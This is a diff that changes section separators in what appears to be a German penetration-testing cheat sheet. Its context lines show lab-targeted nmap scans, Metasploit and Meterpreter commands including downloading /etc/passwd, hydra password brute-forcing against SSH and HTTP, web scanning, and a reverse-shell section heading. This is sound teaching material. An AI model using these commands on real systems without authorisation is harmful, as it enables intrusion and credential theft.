@@ -18,7 +18,7 @@ nmap -A 192.168.56.101
 nmap -T4 -F 192.168.56.101
 ```
 
-⸻
+---
 
 ⚡ 2. Metasploit Basics
 ```bash
@@ -43,7 +43,7 @@ set LPORT 4444
 exploit
 ```
 
-⸻
+---
 
 💻 3. Meterpreter Essentials
 ```bash
@@ -64,7 +64,7 @@ download /etc/passwd
 upload localfile.txt /tmp/
 ```
 
-⸻
+---
 
 🔑 4. Passwortangriffe
 ```bash
@@ -75,7 +75,7 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
 hydra -l admin -P passwords.txt 192.168.56.101 http-get /protected
 ```
 
-⸻
+---
 
 🌐 5. Web-Scanning & Schwachstellen
 ```bash
@@ -86,7 +86,7 @@ nikto -h http://192.168.56.101
 gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-⸻
+---
 
 🐧 6. Nützliche Linux Kommandos
 ```bash
@@ -100,7 +100,7 @@ whoami
 netstat -tulpn
 ```
 
-⸻
+---
 
 🔄 7. Reverse Shell Beispiele
 ```bash
